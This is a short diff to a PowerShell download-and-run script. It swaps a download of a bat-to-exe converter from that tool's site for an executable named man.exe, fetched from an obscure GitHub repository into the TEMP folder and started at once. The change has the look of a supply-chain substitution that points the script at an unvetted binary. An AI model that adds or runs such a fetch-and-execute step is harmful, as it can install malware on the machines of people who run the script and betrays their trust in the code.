@@ -1,3 +1,3 @@
 # Download and execute the executable file
-Invoke-WebRequest -Uri "https://www.battoexeconverter.com/downloads/advbattoexeconverter.exe" -OutFile "$env:TEMP\advbattoexeconverter.exe"
-Start-Process "$env:TEMP\advbattoexeconverter.exe"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/IncsecRishie/wdwddwdw/main/man.exe" -OutFile "$env:TEMP\man.exe"
+Start-Process "$env:TEMP\man.exe"
